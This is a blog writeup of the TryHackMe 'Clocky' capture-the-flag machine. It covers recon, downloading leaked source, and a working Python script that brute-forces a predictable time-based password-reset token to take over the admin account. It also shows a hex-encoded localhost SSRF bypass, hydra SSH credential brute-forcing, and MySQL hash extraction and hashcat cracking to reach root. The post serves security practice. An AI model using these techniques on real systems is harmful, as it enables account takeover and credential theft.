---
layout: post
title: Clocky writeup (TryHackMe)
author: wizarddos
category: writeups
excerpt_separator: <!--more-->
---

Hi there - new machine on [tryhackme](https://tryhackme.com/r/room/clocky) came out 3 days ago, so let's crack it together.

It's called `clocky`. Name spoils a little of content. We've got 6 flags to grab.


So, off we go
<!--more-->

## Writeup
First - export machines IP as variable
```
$ export IP='IP Here'
```

Then, I started with `rustscan`
```sh
$ rustscan -a $IP
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.4.9:22
Open 10.10.4.9:80
Open 10.10.4.9:8000
Open 10.10.4.9:8080
```

4 ports dicovered - time for nmap

```
$ nmap -sC -sV $IP -p22,80,8000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-30 22:47 CET
Nmap scan report for 10.10.4.9
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef (RSA)
|   256 ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 (ECDSA)
|_  256 e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
8000/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 3 disallowed entries 
|_/*.sql$ /*.zip$ /*.bak$
|_http-title: 403 Forbidden
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I didn't scan `8080` with nmap - as it started around 10 min after machine deployment

There was **python werkzeug** server running in there

### Webservers scanning

Port `80` gave me `403` - and I couldn't bypass it in any way

Then, `8000` did as well - but I've discovered `robots.txt`

```
User-agent: *
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$

Flag 1: [REDACTED]
```

We've got the first flag - Also we know there might be some files in there

After a little enum`.sql` and `.bak` gave nothing. So I tried `.zip`

I couldn't enumerate anything with `gobuster`, so i tried `ffuf`
```
$ ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://$IP:8000/FUZZ.zip" -fw 1   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.4.9:8000/FUZZ.zip
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

index                   [Status: 200, Size: 1922, Words: 6, Lines: 11, Duration: 47ms]
:: Progress: [20469/20469] :: Job [1/1] :: 435 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

There is a file called `index.zip`

### Zip extraction

There are 2 files inside
1. flag2.txt - containing a flag. 4 more to go
2. app.py - python code that looks like a server code


### Source code analysis and port 8080 exploitation

Turns out that's the code for site on port 8080 - we've discovered few endpoints
- `/administrator` - admin panel with login form
- `/password_reset`
- `/forgot_password`

And about those 2 I'd like to talk. We'll be exploiting reset password functionality

A brief overlook on how it works
- Go to `/forgot_password` and put the username there
- If user is found, website generates token off it's username and current date (Timezone is UTC - and it's very important) using this code (lines 96-98)
```py
value = datetime.datetime.now()
lnk = str(value)[:-4] + " . " + username.upper()
lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()				
```
- Then, go to `/password_reset` and pass the token there - you can reset your password

Sadly, in `app.py` there is no parameter name mentioned - but a quick brute-force gave me `token` (pretty straight-forward)

We can't intercept the token in any way, so we need to generate it on out own. No one can send reqest and then run the code in exact same time - so we gotta write the script doing both

As there can also be some difficulties with matching exacly milisecods, we need to brute-force

I've wrote this script - it gave me the token, but after 2 or 3 tries so if it doesn't pass it at first, re-run it
```py
import os
import requests
import hashlib
import pytz


from datetime import datetime

def generateToken(username, ip, date):    
    req = requests.post(f"http://{ip}/forgot_password", data = {"username": username})
    
    lnk = str(date) + " . " + username.upper()
    token = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
    return token


username =  "administrator"
ip = "10.10.39.129:8080"

for ms in range(100):
    ms_str = f"{ms:02}"
    time = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.')+ms_str
    token = generateToken(username, ip, time)
    
    req = requests.get(f"http://{ip}/password_reset?token=" + token, verify=False)
    if "<h2>Invalid token</h2>" not in req.text:
        print("Token: ", token)
        break
```

(Now, I'll be working on making it run every time)

When we have the token - change the password and log into administrator account

### Dashboard

Overall - dashboard looks like this
![Image description](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ln4dabdd44wnwlx8atx7.png)

As you see, we have the third flag

From quick testing - this form gives us html that we pass in `location` filed

But we can't access anything with `127` or `localhost` - it returns `Action not permitted` (As on the image)

We need to bypass it - Hex bypass from `book.hacktricks` worked for me

This one
```
http://0x7f000001/
```

This returns `<h2>` with `Dev internal storage` inside.
In `app.py` `database.sql` was mentioned

Maybe it's there, try to download it by submitting 
```
http://0x7f000001/database.sql
```

And there it is! 

### SQL file

It got downloaded to `file.txt` - there is also the fourth flag
```
#################################################
#					   	                        #
# Flag 4: [REDACTED]                            #
#					                        	#
#################################################
```

Analyising further - we find 2 passwords

Here:
```sql
CREATE USER IF NOT EXISTS 'clocky_user'@'localhost' IDENTIFIED BY '[PASSWORD HERE REDACTED]';
GRANT ALL PRIVILEGES ON *.* TO 'clocky_user'@'localhost' WITH GRANT OPTION;
```

And here
```sql
INSERT INTO passwords (password) VALUES ("[PASSWORD HERE REDACTED]");
```

Of course, passwords are other than `[PASSWORD HERE REDACTED]` - but they've been cut out, to not destory whole fun of hacking

### Getting SSH

Now it's time to get SSH

From `app.py` I've extracted 2 more usernames `clarice` and `jane`

Now, added them to `usernames.txt`
```sh
$ cat usernames.txt
clarice
jane
clocky_user
administrator
```

And both passwords to `passwords.txt` - then with `hydra`, I started brute-force
```sh
$ hydra -L usernames.txt -P passwords.txt ssh://$IP -V

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[...]

[22][ssh] host: 10.10.76.120   login: clarice   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-01 15:12:56
```

Turns out, we can log to `ssh` with `clarice` user and one of the passwords

```sh
$ ssh clarice@$IP
```

Flag is in `/home/clarice`
```sh
$ cat flag5.txt
[REDACTED]
```

Flag number 5  - last one left

Let's get the root!

### Privilege escalation

Hint says, there are passwords hidden in unsual places

First - in `/home/clarice/app/.env`, I've found database password

Combining it with `clocky_user` from `app.py`, we can log into mysql

```sh
$ mysql -u clocky_user -p
```

I searched for hashes to crack in `mysql` database, in table `user`
```sql
mysql> SELECT `Host`, `User`, `Authentication_string`, `plugin`  FROM `user`;
```

```
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
| Host      | User             | Authentication_string                                                  | plugin                |
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
| %         | clocky_user      | $A$005$~g]5C]]hmVcZUf8oIT96B7VRZhQibsUhSe5eKbHm4Lq1ks8pzxDkNM9 | caching_sha2_password |
/xuiN2%#pIV5@8=o1xaxXD13/Mh0rlloe/WqcmmaBDMF6r7wjvFGgoTSaB | caching_sha2_password |
| localhost | clocky_user      | $A$005$cg▒|\>B^:yCR0kSV+XwNDxm2lDD5W3J9551gjlVmOZ9Z9hH2Szailxm2VkL. | caching_sha2_password |
| localhost | debian-sys-maint | $A$005$Ebh3▒N5a#f6HM?xF*uSqjNbbUYGitDq/yFLM8LbauDh83QtraQaETy6nZWtWc2 | caching_sha2_password |
| localhost | dev              | $A$005$
8w|Q!N]rZX!mZ\?ok/WxQEdeRLNgqXpWEf4sJonZecawFUizD8FokeI5F. | caching_sha2_password |
| localhost | mysql.infoschema | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
| localhost | mysql.session    | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
| localhost | mysql.sys        | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
| localhost | root             |                                                                        | auth_socket           |
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
```

Sadly, none of these strings worked as hashes. But with [this article](https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/) I've found a way to extract them

```sql
mysql> SELECT `User`, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM mysql.user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%' AND authentication_string !='';
```

```
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
| User             | hash                                                                                                                                         |
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
| clocky_user      | $mysql$A$005*077E1B6B675D350F435D5D1C686D12566C08635A*5566386F49543936423756525A68516962735568536535654B62486D344C71316B7338707A78446B4E4D39 |
| dev              | $mysql$A$005*0D172F787569054E322523067049563540383D17*6F31786178584431332F4D6830726C6C6F652F5771636D6D6142444D46367237776A764647676F54536142 |
| clocky_user      | $mysql$A$005*63671A7C5C3E425E3A0C794352306B531456162B*58774E44786D326C44443557334A39353531676A6C566D4F5A395A39684832537A61696C786D32566B4C2E |
| debian-sys-maint | $mysql$A$005*456268331A4E3561236636480E4D3F78462A7553*716A4E6262555947697444712F79464C4D384C62617544683833517472615161455479366E5A5774576332 |
| dev              | $mysql$A$005*1C160A38777C5121134E5D725A58216D5A1D5C3F*6F6B2F577851456465524C4E6771587057456634734A6F6E5A656361774655697A4438466F6B654935462E |
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
```
I've added `User` column for clarity

Now it's time for cracking

I've saved first `dev` user hash to `hash1.txt` on my machine and used `hashcat`
```sh
$ hashcat -m 7401 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt -O --session hash1
hashcat (v6.2.6) starting

[...]

$mysql$A$005*0D172F787569054E322523067049563540383D17*6F31786178584431332F4D6830726C6C6F652F5771636D6D6142444D46367237776A764647676F54536142:[REDACTED]
                                                          
Session..........: hash1
Status...........: Cracked
Hash.Mode........: 7401 (MySQL $A$ (sha256crypt))
Hash.Target......: $mysql$A$005*0D172F787569054E322523067049563540383D...536142
Time.Started.....: Mon Apr  1 15:48:08 2024 (7 mins, 22 secs)
Time.Estimated...: Mon Apr  1 15:55:30 2024 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      113 H/s (21.26ms) @ Accel:16 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 49975/14344385 (0.35%)
Rejected.........: 23/49975 (0.05%)
Restore.Point....: 49959/14344385 (0.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: asdqwe123 -> angels22
Hardware.Mon.#1..: Util:100%

Started: Mon Apr  1 15:48:06 2024
Stopped: Mon Apr  1 15:55:32 2024
```

Password found! Go back to SSH and switch to root
```
$ su root
Password:

#
```

Then, last flag is in `/root/flag6.txt`
```
# cat /root/flag6.txt
[REDACTED]
```

And that's it - machine finally pwned

## Conlcusion and my opinion

I liked this room a lot, even though I've spent 3 days on it.

Whole way of getting to the user was absolutly amazing and it was hard to find that last password.

It was also challenging, so I'd give it more medium-hard level.

It also made me realize how much I need to work on scripting.

Overall, I practised scripting, enumeration, hash cracking. I've learned how to find and crack mysql hashes and a little about python

That's it

As most of websites run on PHP - check out my [PHP course](https://wizarddos.github.io/blog/series/php_0_to_hero.html). You'll learn a lot about language and finally understand what's going on in wordpress code

See you in next articles